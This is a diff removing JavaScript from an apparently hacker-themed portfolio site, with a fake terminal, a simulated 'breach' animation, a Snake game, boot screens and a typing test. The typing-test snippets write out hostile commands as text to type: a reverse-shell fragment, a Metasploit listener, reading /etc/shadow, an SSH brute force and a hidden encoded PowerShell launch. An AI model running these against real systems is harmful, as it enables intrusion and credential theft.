-    printTerm('');
-    printTerm('<span class="t-muted">Type</span> <span class="t-green">open about</span> <span class="t-muted">for full profile window.</span>');
-  } else if(termData[c]){
-    printTerm(termData[c]);
-  } else {
-    printTerm(`<span class="t-red">command not found: ${cmd}</span> — type <span class="t-green">help</span>`);
-  }
-}
-
-function runHack(target, done){
-  // Parse target from "hack target.com" or just "target.com"
-  const tgt = target.replace(/^hack\s+/i,'').trim() || "unknown.target";
-  const ip = Array.from({length:4},()=>Math.floor(Math.random()*254)+1).join(".");
-
-  const phases = [
-    {delay:200,  fn:()=>{
-      printTerm(`<span class="t-muted">┌──────────────────────────────────────┐</span>`);
-      printTerm(`<span class="t-muted">│</span>  <span class="t-red">⚡ INITIATING BREACH PROTOCOL</span>       <span class="t-muted">│</span>`);
-      printTerm(`<span class="t-muted">└──────────────────────────────────────┘</span>`);
-    }},
-    {delay:400,  fn:()=>printTerm(`<span class="t-muted">[*]</span> Target    : <span class="t-green">${tgt}</span>`)},
-    {delay:600,  fn:()=>printTerm(`<span class="t-muted">[*]</span> Resolving : <span class="t-green">${tgt}</span> → <span class="t-yellow">${ip}</span>`)},
-    {delay:900,  fn:()=>printTerm(`<span class="t-muted">[*]</span> Starting Nmap 7.95 scan on <span class="t-yellow">${ip}</span>`)},
-    {delay:1300, fn:()=>{
-      const ports=[[22,"ssh","OpenSSH 8.9p1"],[80,"http","nginx/1.24.0"],[443,"https","nginx/1.24.0"],[8443,"https-alt","Apache/2.4.58"],[3306,"mysql","MySQL 8.0.35"]];
-      const open=ports.filter(()=>Math.random()>0.35);
-      open.forEach(([p,s,v])=>printTerm(`<span class="t-green">  OPEN</span>   <span class="t-yellow">${p}/tcp</span>  ${s.padEnd(12)} <span class="t-muted">${v}</span>`));
-    }},
-    {delay:2000, fn:()=>printTerm(`<span class="t-muted">[*]</span> Running CVE scanner... <span class="t-yellow">CVE-2024-1337, CVE-2023-44487</span>`)},
-    {delay:2600, fn:()=>printTerm(`<span class="t-red">[!]</span> Vulnerability found: <span class="t-red">SQL Injection</span> at <span class="t-green">/${tgt.split(".")[0]}/login.php</span>`)},
-    {delay:3100, fn:()=>printTerm(`<span class="t-muted">[*]</span> Launching sqlmap payload...`)},
-    {delay:3400, fn:()=>{
-      let p=0;
-      const iv=setInterval(()=>{
-        p+=Math.floor(Math.random()*15)+5;
-        if(p>=100){p=100;clearInterval(iv);}
-        const bar="█".repeat(Math.floor(p/5))+"░".repeat(20-Math.floor(p/5));
-        const lastLine=document.querySelector("#termOutput .t-progress");
-        const html=`<span class="t-green">[${bar}]</span> <span class="t-yellow">${p}%</span>`;
-        if(lastLine){lastLine.innerHTML=html;}else{printTerm(`<span class="t-progress">${html}</span>`);}
-      },120);
-    }},
-    {delay:6800, fn:()=>printTerm(`<span class="t-red">[!]</span> Database dumped: <span class="t-green">users</span>, <span class="t-green">sessions</span>, <span class="t-green">credentials</span>`)},
-    {delay:7200, fn:()=>printTerm(`<span class="t-muted">[*]</span> Cracking password hashes... <span class="t-yellow">md5crypt</span>`)},
-    {delay:7700, fn:()=>printTerm(`<span class="t-red">[✓]</span> <span class="t-green">admin:Password123!</span>  <span class="t-muted">// cracked in 0.3s</span>`)},
-    {delay:8100, fn:()=>printTerm(`<span class="t-red">[✓]</span> <span class="t-green">root:toor</span>           <span class="t-muted">// cracked in 0.1s</span>`)},
-    {delay:8600, fn:()=>printTerm(`<span class="t-muted">[*]</span> Spawning reverse shell on port <span class="t-yellow">4444</span>...`)},
-    {delay:9100, fn:()=>{
-      printTerm(`<span class="t-red">root@${tgt}:/#</span> <span class="t-muted">uid=0(root) gid=0(root) groups=0(root)</span>`);
-      printTerm(`<span class="t-muted">┌──────────────────────────────────────┐</span>`);
-      printTerm(`<span class="t-muted">│</span>  <span class="t-red">⚡ BREACH COMPLETE</span> — <span class="t-green">ROOT ACCESS</span>     <span class="t-muted">│</span>`);
-      printTerm(`<span class="t-muted">│</span>  <span class="t-muted">[ FOR EDUCATIONAL / CTF USE ONLY ]</span>   <span class="t-muted">│</span>`);
-      printTerm(`<span class="t-muted">└──────────────────────────────────────┘</span>`);
-      if(done)done();
-    }},
-  ];
-  phases.forEach(({delay,fn})=>setTimeout(fn,delay));
-}
-
-function runScan(){
-  const targets=["192.168.1.1","10.0.0.254","172.16.0.1"];
-  const ports=["22 (SSH)","80 (HTTP)","443 (HTTPS)","8080 (HTTP-ALT)","3306 (MySQL)","5432 (PostgreSQL)"];
-  printTerm(`<span class="t-green">Starting Nmap 7.95 ( https://nmap.org )</span>`);
-  let i=0;
-  function tick(){
-    if(i<targets.length){
-      const t=targets[i];
-      const openPorts=ports.filter(()=>Math.random()>0.5);
-      setTimeout(()=>{
-        printTerm(`<span class="t-blue">Scanning ${t}...</span>`);
-        openPorts.forEach(p=>printTerm(`  <span class="t-green">OPEN</span>  ${p}`));
-        i++;tick();
-      },600);
-    } else {
-      printTerm(`<span class="t-green">Scan complete. ${targets.length} hosts scanned.</span>`);
-    }
-  }tick();
-}
-
-// ===================== KONAMI =====================
-const konamiSeq=["arrowup","arrowup","arrowdown","arrowdown","arrowleft","arrowright","arrowleft","arrowright","b","a"];
-let ki=0;
-window.addEventListener("keydown",(e)=>{
-  if(e.key.toLowerCase()===konamiSeq[ki]){
-    ki++;
-    if(ki===konamiSeq.length){
-      triggerAlert();ki=0;
-    }
-  } else ki=0;
-});
-
-function triggerAlert(){
-  const overlay=document.getElementById("alertOverlay");
-  overlay.classList.add("show");
-  setTimeout(()=>overlay.classList.remove("show"),7000);
-}
-
-
-// ══ SNAKE GAME ══════════════════════════════════════════════════════════════
-var snakeState={player:"",score:0,hi:0,snake:[],dir:{x:1,y:0},nextDir:{x:1,y:0},
-  food:{x:0,y:0},running:false,paused:false,dead:false,speed:130,tick:null,cols:20,rows:20,cell:16};
-
-var SLB_KEY="snakeLB_v3";
-function snakeGetLb(){try{var d=localStorage.getItem(SLB_KEY);return d?JSON.parse(d):[]}catch(e){return [];}}
-function snakeSaveLb(lb){try{localStorage.setItem(SLB_KEY,JSON.stringify(lb));}catch(e){}}
-function snakeSaveScore(name,score){
-  var lb=snakeGetLb();
-  var ex=lb.find(function(e){return e.name===name;});
-  if(ex){if(score>ex.score)ex.score=score;}else{lb.push({name:name,score:score});}
-  lb.sort(function(a,b){return b.score-a.score;});lb=lb.slice(0,10);snakeSaveLb(lb);return lb;
-}
-
-function startSnakeGame(){
-  var inp=document.getElementById("snakeNameInput");
-  var err=document.getElementById("snakeNameErr");
-  // Strip any non-alphanumeric just in case
-  inp.value=inp.value.replace(/[^a-zA-Z0-9]/g,"");
-  var name=inp.value.trim();
-  if(name.length<2){err.textContent="Min 2 chars required";return;}
-  if(name.length>12){name=name.slice(0,12);inp.value=name;}
-  err.textContent="";
-  snakeState.player=name;
-  var lb=snakeGetLb();var me=lb.find(function(e){return e.name===name;});
-  snakeState.hi=me?me.score:0;
-  document.getElementById("snakePlayerLabel").textContent=name;
-  document.getElementById("snakeHiLabel").textContent=snakeState.hi;
-  document.getElementById("snakeNameModal").style.display="none";
-  document.getElementById("snakeHUD").style.display="flex";
-  document.getElementById("snakeCanvasWrap").style.display="flex";
-  // Show side panel and d-pad
-  var sp=document.getElementById("snakeSidePanel");if(sp)sp.style.display="flex";
-  // Show mobile dpad on touch devices
-  if('ontouchstart' in window){
-    var dp=document.getElementById("snakeDpadBottom");if(dp)dp.style.display="block";
-  }
-  snakeUpdateSidePanel();
-  snakeInit();
-}
-
-function snakeInit(){
-  var st=snakeState;
-  var wrap=document.getElementById("snakeCanvasWrap");
-  var canvas=document.getElementById("snakeCanvas");if(!canvas||!wrap)return;
-  var w=wrap.clientWidth||340, h=wrap.clientHeight||340;
-  // Reserve space for d-pad on mobile
-  var avail=Math.min(w, h);
-  st.cell=Math.max(12,Math.floor(avail/st.cols));
-  canvas.width=st.cell*st.cols;canvas.height=st.cell*st.rows;
-  st.snake=[{x:10,y:10},{x:9,y:10},{x:8,y:10}];
-  st.dir={x:1,y:0};st.nextDir={x:1,y:0};
-  st.score=0;st.dead=false;st.paused=false;st.speed=130;
-  document.getElementById("snakeScoreLabel").textContent="0";
-  snakePlaceFood();
-  if(st.tick)clearInterval(st.tick);
-  st.running=true;
-  document.getElementById("snakeDeadOverlay").style.display="none";
-  document.getElementById("snakePauseOverlay").style.display="none";
-  st.tick=setInterval(snakeTick,st.speed);
-  requestAnimationFrame(snakeDraw);
-}
-
-function snakePlaceFood(){
-  var st=snakeState,pos;
-  do{pos={x:Math.floor(Math.random()*st.cols),y:Math.floor(Math.random()*st.rows)};}
-  while(st.snake.some(function(s){return s.x===pos.x&&s.y===pos.y;}));
-  st.food=pos;
-}
-
-function snakeTick(){
-  var st=snakeState;if(!st.running||st.paused||st.dead)return;
-  st.dir=st.nextDir;
-  var head={x:st.snake[0].x+st.dir.x,y:st.snake[0].y+st.dir.y};
-  if(head.x<0||head.x>=st.cols||head.y<0||head.y>=st.rows){snakeDie();return;}
-  if(st.snake.some(function(s){return s.x===head.x&&s.y===head.y;})){snakeDie();return;}
-  st.snake.unshift(head);
-  if(head.x===st.food.x&&head.y===st.food.y){
-    st.score+=10;
-    document.getElementById("snakeScoreLabel").textContent=st.score;
-    if(st.score>st.hi){st.hi=st.score;document.getElementById("snakeHiLabel").textContent=st.hi;}
-    snakePlaceFood();
-    if(st.speed>60){st.speed=Math.max(60,st.speed-5);clearInterval(st.tick);st.tick=setInterval(snakeTick,st.speed);}
-  }else{st.snake.pop();}
-}
-
-function snakeRgb(hex){
-  hex=(hex||"#00ff9d").replace(/[^0-9a-fA-F]/g,"");
-  if(hex.length===3)hex=hex[0]+hex[0]+hex[1]+hex[1]+hex[2]+hex[2];
-  return parseInt(hex.slice(0,2),16)+","+parseInt(hex.slice(2,4),16)+","+parseInt(hex.slice(4,6),16);
-}
-
-function snakeDraw(){
-  var st=snakeState;
-  var canvas=document.getElementById("snakeCanvas");if(!canvas)return;
-  var ctx=canvas.getContext("2d");
-  var accent=(getComputedStyle(document.documentElement).getPropertyValue("--accent")||"#00ff9d").trim();
-  var rgb=snakeRgb(accent);var c=st.cell;
-  ctx.fillStyle="#000";ctx.fillRect(0,0,canvas.width,canvas.height);
-  ctx.strokeStyle="rgba(255,255,255,0.03)";ctx.lineWidth=0.5;
-  for(var i=0;i<=st.cols;i++){ctx.beginPath();ctx.moveTo(i*c,0);ctx.lineTo(i*c,canvas.height);ctx.stroke();}
-  for(var j=0;j<=st.rows;j++){ctx.beginPath();ctx.moveTo(0,j*c);ctx.lineTo(canvas.width,j*c);ctx.stroke();}
-  // Glowing wall boundary
-  var bw=2.5;
-  ctx.save();
-  ctx.shadowColor=accent;ctx.shadowBlur=14;
-  ctx.strokeStyle=accent;ctx.lineWidth=bw;ctx.globalAlpha=0.85;
-  ctx.strokeRect(bw/2,bw/2,canvas.width-bw,canvas.height-bw);
-  ctx.restore();
-  // Corner brackets
-  var br=Math.min(20,c*1.4);
-  ctx.save();ctx.strokeStyle=accent;ctx.lineWidth=2;ctx.globalAlpha=0.95;
-  [[0,0,1,1],[canvas.width,0,-1,1],[0,canvas.height,1,-1],[canvas.width,canvas.height,-1,-1]].forEach(function(p){
-    ctx.beginPath();ctx.moveTo(p[0]+p[2]*br,p[1]);ctx.lineTo(p[0],p[1]);ctx.lineTo(p[0],p[1]+p[3]*br);ctx.stroke();
-  });
-  ctx.restore();
-  // Food pulse
-  var pulse=0.6+0.4*Math.sin(Date.now()/300);
-  ctx.save();ctx.shadowColor=accent;ctx.shadowBlur=12*pulse;
-  ctx.fillStyle=accent;ctx.beginPath();ctx.arc(st.food.x*c+c/2,st.food.y*c+c/2,c*0.38,0,Math.PI*2);ctx.fill();ctx.restore();
-  // Snake segments
-  for(var i=0;i<st.snake.length;i++){
-    var seg=st.snake[i];var frac=1-i/st.snake.length;
-    ctx.save();if(i===0){ctx.shadowColor=accent;ctx.shadowBlur=14;}
-    ctx.fillStyle=i===0?accent:"rgba("+rgb+","+(0.2+0.8*frac)+")";
-    var pad=i===0?1:2,rr=c*0.18;
-    var x=seg.x*c+pad,y=seg.y*c+pad,w=c-pad*2,h=c-pad*2;
-    ctx.beginPath();ctx.moveTo(x+rr,y);ctx.lineTo(x+w-rr,y);ctx.arcTo(x+w,y,x+w,y+rr,rr);
-    ctx.lineTo(x+w,y+h-rr);ctx.arcTo(x+w,y+h,x+w-rr,y+h,rr);ctx.lineTo(x+rr,y+h);ctx.arcTo(x,y+h,x,y+h-rr,rr);
-    ctx.lineTo(x,y+rr);ctx.arcTo(x,y,x+rr,y,rr);ctx.closePath();ctx.fill();ctx.restore();
-    if(i===0){
-      ctx.fillStyle="#000";
-      var ex1={x:seg.x*c+c/2+st.dir.y*c*0.22+st.dir.x*c*0.25,y:seg.y*c+c/2-st.dir.x*c*0.22+st.dir.y*c*0.25};
-      var ex2={x:seg.x*c+c/2-st.dir.y*c*0.22+st.dir.x*c*0.25,y:seg.y*c+c/2+st.dir.x*c*0.22+st.dir.y*c*0.25};
-      ctx.beginPath();ctx.arc(ex1.x,ex1.y,c*0.09,0,Math.PI*2);ctx.fill();
-      ctx.beginPath();ctx.arc(ex2.x,ex2.y,c*0.09,0,Math.PI*2);ctx.fill();
-    }
-  }
-  if(st.running&&!st.dead)requestAnimationFrame(snakeDraw);
-}
-
-function snakeDie(){
-  var st=snakeState;st.dead=true;st.running=false;clearInterval(st.tick);
-  snakeSaveScore(st.player,st.score);
-  snakeUpdateSidePanel();
-  var newBest=st.score>0&&st.score===st.hi;
-  document.getElementById("snakeFinalScore").textContent="Score: "+st.score+(newBest?" 🏆 NEW BEST!":"");
-  document.getElementById("snakeDeadOverlay").style.display="flex";
-  var canvas=document.getElementById("snakeCanvas");
-  if(canvas){var ctx=canvas.getContext("2d");ctx.fillStyle="rgba(255,51,85,0.14)";ctx.fillRect(0,0,canvas.width,canvas.height);}
-}
-
-function snakeUpdateSidePanel(){
-  var list=document.getElementById("snakeSideLbList");if(!list)return;
-  var lb=snakeGetLb();
-  if(!lb.length){list.innerHTML='<div style="color:var(--muted);font-size:0.62rem;padding:12px 8px;text-align:center;">No scores yet</div>';return;}
-  var medals=["\uD83E\uDD47","\uD83E\uDD48","\uD83E\uDD49"];
-  list.innerHTML=lb.map(function(e,i){
-    var me=e.name===snakeState.player;
-    return '<div style="padding:7px 8px;border-bottom:1px solid #0f0f0f;display:flex;flex-direction:column;gap:1px;'+(me?"background:rgba(var(--accent-rgb),0.06);":"")+'">'+
-      '<div style="display:flex;align-items:center;gap:5px;">'+
-        '<span style="font-size:'+(i<3?"0.85rem":"0.68rem")+';width:18px;text-align:center;">'+(medals[i]||("#"+(i+1)))+'</span>'+
-        '<span style="font-size:0.7rem;color:'+(me?"var(--accent)":"var(--text)")+';flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">'+e.name+'</span>'+
-      '</div>'+
-      '<div style="text-align:right;font-size:0.75rem;color:var(--accent);font-weight:700;padding-right:2px;">'+e.score+'</div>'+
-    '</div>';
-  }).join("");
-}
-
-function snakeRetry(){document.getElementById("snakeDeadOverlay").style.display="none";snakeInit();}
-function snakeChangeUser(){
-  var st=snakeState;if(st.tick)clearInterval(st.tick);st.running=false;
-  document.getElementById("snakeDeadOverlay").style.display="none";
-  document.getElementById("snakeCanvasWrap").style.display="none";
-  document.getElementById("snakeHUD").style.display="none";
-  document.getElementById("snakeNameInput").value="";
-  document.getElementById("snakeNameErr").textContent="";
-  document.getElementById("snakeNameModal").style.display="flex";
-  var dp=document.getElementById("snakeDpadBottom");if(dp)dp.style.display="none";
-}
-function snakeTogglePause(){
-  var st=snakeState;
-  if(!st.running&&!st.paused)return;
-  st.paused=!st.paused;
-  document.getElementById("snakePauseOverlay").style.display=st.paused?"flex":"none";
-}
-function snakeMobileDir(x,y){
-  if(x===0&&y===0){snakeTogglePause();return;}
-  var d=snakeState.nextDir;
-  if(x!==0&&d.x!==0)return;
-  if(y!==0&&d.y!==0)return;
-  snakeState.nextDir={x:x,y:y};
-}
-
-// Keyboard — skip entirely if any input/textarea is focused
-window.addEventListener("keydown",function(e){
-  var win=document.getElementById("win-snake");
-  if(!win||win.style.display==="none")return;
-  // Don't hijack keys when user is typing in an input
-  if(document.activeElement&&(document.activeElement.tagName==="INPUT"||document.activeElement.tagName==="TEXTAREA"))return;
-  var st=snakeState;var d=st.nextDir;
-  if(e.key==="ArrowUp"||e.key==="w"||e.key==="W"){if(d.y===0){st.nextDir={x:0,y:-1};}e.preventDefault();}
-  else if(e.key==="ArrowDown"||e.key==="s"||e.key==="S"){if(d.y===0){st.nextDir={x:0,y:1};}e.preventDefault();}
-  else if(e.key==="ArrowLeft"||e.key==="a"||e.key==="A"){if(d.x===0){st.nextDir={x:-1,y:0};}e.preventDefault();}
-  else if(e.key==="ArrowRight"||e.key==="d"||e.key==="D"){if(d.x===0){st.nextDir={x:1,y:0};}e.preventDefault();}
-  else if(e.key==="p"||e.key==="P"){snakeTogglePause();}
-});
-// ══ END SNAKE ════════════════════════════════════════════════════════════════
-
-// ══ TOUCH & MOBILE ═══════════════════════════════════════════════════════════
-// Touch drag for windows
-function startDragTouch(e,winId){
-  if(e.target.classList.contains("win-dot"))return;
-  var win=document.getElementById(winId);
-  if(!win||win.classList.contains("maximized"))return;
-  var t=e.touches[0];
-  dragState={winId:winId,startX:t.clientX,startY:t.clientY,
-    origLeft:parseInt(win.style.left)||0,origTop:parseInt(win.style.top)||0};
-  document.addEventListener("touchmove",onDragTouch,{passive:false});
-  document.addEventListener("touchend",stopDragTouch);
-  e.preventDefault();
-}
-function onDragTouch(e){
-  if(!dragState)return;
-  var win=document.getElementById(dragState.winId);
-  var t=e.touches[0];
-  win.style.left=(dragState.origLeft+(t.clientX-dragState.startX))+"px";
-  win.style.top=Math.max(0,dragState.origTop+(t.clientY-dragState.startY))+"px";
-  e.preventDefault();
-}
-function stopDragTouch(){
-  dragState=null;
-  document.removeEventListener("touchmove",onDragTouch);
-  document.removeEventListener("touchend",stopDragTouch);
-}
-
-// Touch resize for windows
-function startResizeTouch(e,winId){
-  var win=document.getElementById(winId);
-  var t=e.touches[0];
-  resizeState={winId:winId,startX:t.clientX,startY:t.clientY,
-    origW:win.offsetWidth,origH:win.offsetHeight};
-  document.addEventListener("touchmove",onResizeTouch,{passive:false});
-  document.addEventListener("touchend",stopResizeTouch);
-  e.preventDefault();e.stopPropagation();
-}
-function onResizeTouch(e){
-  if(!resizeState)return;
-  var win=document.getElementById(resizeState.winId);
-  var t=e.touches[0];
-  win.style.width=Math.max(280,resizeState.origW+(t.clientX-resizeState.startX))+"px";
-  win.style.height=Math.max(180,resizeState.origH+(t.clientY-resizeState.startY))+"px";
-  e.preventDefault();
-}
-function stopResizeTouch(){
-  resizeState=null;
-  document.removeEventListener("touchmove",onResizeTouch);
-  document.removeEventListener("touchend",stopResizeTouch);
-}
-
-// Single-tap icons on mobile
-function iconTap(e,name){
-  e.preventDefault();
-  openWindow(name);
-}
-// ══ END TOUCH ════════════════════════════════════════════════════════════════
-
-
-// ══ TRAY ICONS ═══════════════════════════════════════════════════════════════
-(function(){
-  if(navigator.getBattery){
-    navigator.getBattery().then(function(b){
-      function update(){
-        var pct=Math.round(b.level*100);
-        var fill=document.getElementById("battFill");
-        if(fill){
-          var w=Math.max(2,Math.round(pct/100*16));
-          fill.setAttribute("width",w);
-          fill.setAttribute("fill",pct<20?"#ff3355":pct<50?"#febc2e":"currentColor");
-        }
-        var tray=document.getElementById("trayBattery");
-        if(tray)tray.title="Battery: "+pct+"% "+(b.charging?"(charging)":"");
-      }
-      b.addEventListener("levelchange",update);
-      b.addEventListener("chargingchange",update);
-      update();
-    });
-  }
-  function updateWifi(){
-    var el=document.getElementById("trayWifi");
-    if(!el)return;
-    if(navigator.onLine){el.style.color="";el.title="WiFi: Connected";}
-    else{el.style.color="#ff3355";el.title="WiFi: Disconnected";}
-  }
-  window.addEventListener("online",updateWifi);
-  window.addEventListener("offline",updateWifi);
-  updateWifi();
-})();
-
-// ══ BOOT / SHUTDOWN SEQUENCE ═════════════════════════════════════════════════
-window.addEventListener("keydown",function(e){
-  if((e.key==="F5")||(e.ctrlKey&&(e.key==="r"||e.key==="R"))||(e.metaKey&&(e.key==="r"||e.key==="R"))){
-    e.preventDefault();
-    triggerShutdown(function(){location.reload();});
-  }
-});
-
-function triggerShutdown(onDone){
-  var overlay=document.getElementById("shutdownOverlay");
-  var log=document.getElementById("shutdownLog");
-  if(!overlay)return;
-  overlay.style.display="flex";log.innerHTML="";
-
-  var shutLines=[
-    {t:0,   s:"[ <span style='color:#28c840'>OK</span> ] Stopping Snake Game service..."},
-    {t:220, s:"[ <span style='color:#28c840'>OK</span> ] Stopping terminal sessions..."},
-    {t:430, s:"[ <span style='color:#28c840'>OK</span> ] Flushing filesystem buffers..."},
-    {t:640, s:"[ <span style='color:#28c840'>OK</span> ] Saving session state to /var/cache..."},
-    {t:860, s:"[ <span style='color:#febc2e'>!!</span> ] <span style='color:#febc2e'>Archiving 50+ VAPT assessment reports...</span>"},
-    {t:1080,s:"[ <span style='color:#28c840'>OK</span> ] Unmounting /dev/sda1 ..."},
-    {t:1300,s:"[ <span style='color:#28c840'>OK</span> ] Stopping network manager (root-net)..."},
-    {t:1520,s:"[ <span style='color:#28c840'>OK</span> ] All processes terminated."},
-    {t:1760,s:"<span style='color:#00ff9d'>Ankesh-OS — Rebooting in 3...</span>"},
-    {t:2360,s:"<span style='color:#00ff9d'>Ankesh-OS — Rebooting in 2...</span>"},
-    {t:2960,s:"<span style='color:#00ff9d'>Ankesh-OS — Rebooting in 1...</span>"},
-    {t:3560,s:"<span style='color:#ff5f57'>⏻  System halted.</span>"},
-  ];
-  shutLines.forEach(function(l){
-    setTimeout(function(){
-      var d=document.createElement("div");d.innerHTML=l.s;log.appendChild(d);log.scrollTop=log.scrollHeight;
-    },l.t);
-  });
-
-  // Black pause, then boot log
-  setTimeout(function(){
-    log.innerHTML="";
-    var bootLines=[
-      {t:0,   s:"<span style='color:#00ff9d;font-size:1.05rem;font-weight:700;letter-spacing:0.08em'>Ankesh-OS 2.5.1 (Ankesh Edition)</span>"},
-      {t:280, s:"<span style='color:#6e7681'>CPU: Intel Core i9-13900K &nbsp; RAM: 32768MB &nbsp; SSD: 1TB NVME</span>"},
-      {t:520, s:"[ <span style='color:#28c840'>OK</span> ] Loading kernel modules..."},
-      {t:720, s:"[ <span style='color:#28c840'>OK</span> ] Starting udev daemon..."},
-      {t:920, s:"[ <span style='color:#28c840'>OK</span> ] Mounting /dev/sda1 on / (ext4, ro)"},
-      {t:1100,s:"[ <span style='color:#28c840'>OK</span> ] Mounting virtual filesystems (/proc /sys /dev)"},
-      {t:1300,s:"[ <span style='color:#28c840'>OK</span> ] Started Network Manager (root-net)"},
-      {t:1500,s:"[ <span style='color:#28c840'>OK</span> ] OpenSSH server running on :22"},
-      {t:1700,s:"[ <span style='color:#28c840'>OK</span> ] Firewall rules applied (iptables + nftables)"},
-      {t:1900,s:"[ <span style='color:#28c840'>OK</span> ] VPN tunnel up (wg0 — 10.8.0.1)"},
-      {t:2100,s:"[ <span style='color:#febc2e'>!!</span> ] <span style='color:#febc2e'>Security notice: 3 failed SSH attempts since last boot</span>"},
-      {t:2340,s:"[ <span style='color:#28c840'>OK</span> ] Starting portfolio renderer (v2.5.1)..."},
-      {t:2560,s:"[ <span style='color:#28c840'>OK</span> ] Loading VAPT workspace..."},
-      {t:2760,s:"[ <span style='color:#28c840'>OK</span> ] Reached target: Graphical Interface"},
-      {t:3000,s:"<span style='color:#00ff9d;font-weight:700'>ankesh@root login: <span style='animation:blink 1s step-end infinite'>█</span></span>"},
-    ];
-    bootLines.forEach(function(l){
-      setTimeout(function(){
-        var d=document.createElement("div");d.innerHTML=l.s;log.appendChild(d);log.scrollTop=log.scrollHeight;
-      },l.t);
-    });
-    setTimeout(function(){
-      overlay.style.transition="opacity 0.7s";overlay.style.opacity="0";
-      setTimeout(function(){
-        overlay.style.display="none";overlay.style.opacity="1";overlay.style.transition="";
-        if(onDone)onDone();
-      },700);
-    },3500);
-  },4000);
-}
-
-// ══════════════════════════════════════════════════════════════════
-// INTRUDER ALERT TOAST — cybersec flavoured pop-up on load
-// ══════════════════════════════════════════════════════════════════
-setTimeout(showIntruderAlert, 3600);
-function showIntruderAlert() {
-  // Remove if already exists
-  const old = document.getElementById("intruderToast");
-  if(old) old.remove();
-
-  const toast = document.createElement("div");
-  toast.id = "intruderToast";
-  toast.innerHTML = `
-    <div style="display:flex;align-items:flex-start;gap:10px;">
-      <div style="font-size:1.1rem;flex-shrink:0;margin-top:1px;animation:toastPulse 1s ease-in-out infinite;">⚠</div>
-      <div style="flex:1;">
-        <div style="font-size:0.65rem;color:#ff3355;letter-spacing:0.18em;font-weight:700;margin-bottom:3px;">[ SECURITY ALERT ]</div>
-        <div style="font-size:0.78rem;color:#c9d1d9;line-height:1.5;">Intruder detected on network</div>
-        <div style="font-size:0.7rem;color:#6e7681;margin-top:2px;">Origin: <span style="color:var(--accent);font-weight:600;">unknown</span> &nbsp;·&nbsp; Tracing...</div>
-        <div style="font-size:0.62rem;color:#6e7681;margin-top:4px;letter-spacing:0.06em;">IP logged · Tracing route...</div>
-      </div>
-      <div onclick="document.getElementById('intruderToast').remove()" style="cursor:pointer;color:#6e7681;font-size:0.75rem;padding:2px 4px;opacity:0.6;hover:opacity:1;">✕</div>
-    </div>
-    <div style="margin-top:8px;height:2px;background:rgba(255,51,85,0.15);border-radius:1px;overflow:hidden;">
-      <div id="toastProgress" style="height:100%;width:100%;background:linear-gradient(90deg,#ff3355,#ff6b35);border-radius:1px;transition:width linear;"></div>
-    </div>
-  `;
-  toast.style.cssText = `
-    position:fixed;bottom:58px;right:14px;z-index:99998;
-    background:#0d1117;border:1px solid rgba(255,51,85,0.4);border-radius:8px;
-    padding:12px 14px;width:260px;
-    box-shadow:0 4px 24px rgba(0,0,0,0.7),0 0 0 1px rgba(255,51,85,0.1),0 0 20px rgba(255,51,85,0.08);
-    font-family:'Fira Code',monospace;
-    animation:toastSlideIn 0.35s cubic-bezier(0.34,1.56,0.64,1) forwards;
-    backdrop-filter:blur(12px);
-  `;
-
-  // Inject keyframes if not present
-  if(!document.getElementById("toastKeyframes")){
-    const style = document.createElement("style");
-    style.id = "toastKeyframes";
-    style.textContent = `
-      @keyframes toastSlideIn{from{opacity:0;transform:translateY(20px) scale(0.95)}to{opacity:1;transform:translateY(0) scale(1)}}
-      @keyframes toastSlideOut{from{opacity:1;transform:translateY(0)}to{opacity:0;transform:translateY(12px)}}
-      @keyframes toastPulse{0%,100%{color:#ff3355}50%{color:#febc2e}}
-    `;
-    document.head.appendChild(style);
-  }
-
-  document.body.appendChild(toast);
-
-  // Shrink progress bar over 5 seconds then auto dismiss
-  const bar = document.getElementById("toastProgress");
-  setTimeout(() => { if(bar) bar.style.width = "0%"; bar.style.transitionDuration = "4.8s"; }, 100);
-  setTimeout(() => {
-    if(toast.parentNode){
-      toast.style.animation = "toastSlideOut 0.3s ease forwards";
-      setTimeout(() => { if(toast.parentNode) toast.remove(); }, 300);
-    }
-  }, 5000);
-}
-
-// ══════════════════════════════════════════════════════════════════
-// HACKER TYPING TEST
-// ══════════════════════════════════════════════════════════════════
-const TT_SNIPPETS = {
-  easy: [
-    'nmap -sV -p 80,443,22 192.168.1.1',
-    'grep -r password /var/log/ 2>/dev/null',
-    'sudo netstat -tulpn | grep LISTEN',
-    'curl -X POST http://target.com/login -d user=admin',
-    'cat /etc/passwd | cut -d: -f1',
-    'ssh root@10.0.0.1 -p 2222 -i id_rsa',
-    'find / -perm -4000 -type f 2>/dev/null',
-    'hydra -l admin -P pass.txt ssh://192.168.0.1',
-    'ping -c 4 8.8.8.8 && echo reachable',
-    'ls -la /home/ && whoami && id',
-  ],
-  hard: [
-    'msfconsole -q -x "use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 4444; run"',
-    'python3 -c "import socket,os; s=socket.socket(); s.connect((10.0.0.1,4444)); os.dup2(s.fileno(),0)"',
-    'openssl s_client -connect target.com:443 | openssl x509 -noout -text | grep Subject',
-    'awk -F: "{if($3==0)print $1}" /etc/passwd && cat /etc/shadow | grep -v locked',
-    'tcpdump -i eth0 -w capture.pcap port 80 or port 443 && tshark -r capture.pcap -T fields',
-  ],
-  elite: [
-    'import socket,threading; scan=lambda h,p: socket.create_connection((h,p),0.5) and True',
-    'SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE pass;',
-    'powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==',
-    'iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 4 -j DROP',
-    'volatility -f memory.dmp --profile=Win7SP1x64 pstree | grep -E cmd.powershell && malfind',
-  ]
-};
-
-let ttCurrentDiff = 'easy';
-let ttSnippet = '';
-let ttStartTime = null;
-let ttTimer = null;
-let ttTimeLeft = 60;
-let ttTotalTyped = 0;
-let ttCorrectTyped = 0;
-let ttActive = false;
-let ttFinished = false;
-
-function setTTDiff(diff){
-  ttCurrentDiff = diff;
-  ['easy','hard','elite'].forEach(d => {
-    const btn = document.getElementById('ttDiff' + d.charAt(0).toUpperCase() + d.slice(1));
-    if(!btn) return;
-    if(d === diff){
-      btn.style.borderColor = 'rgba(0,255,157,0.3)';
-      btn.style.background = 'rgba(0,255,157,0.12)';
-      btn.style.color = 'var(--accent)';
-    } else {
-      btn.style.borderColor = '#30363d';
-      btn.style.background = 'transparent';
-      btn.style.color = '#6e7681';
-    }
-  });
-}
-
-function getTTSnippet(){
-  const pool = TT_SNIPPETS[ttCurrentDiff];
